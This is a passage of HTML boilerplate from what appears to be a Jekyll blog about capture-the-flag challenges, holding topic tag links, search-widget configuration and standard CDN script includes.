href="/tags/stegano/">Stegano</a> <a class="post-tag" href="/tags/fcsc/">FCSC</a> <a class="post-tag" href="/tags/forensic/">Forensic</a> <a class="post-tag" href="/tags/osint/">OSINT</a> <a class="post-tag" href="/tags/stega/">Stega</a> <a class="post-tag" href="/tags/reverse/">Reverse</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
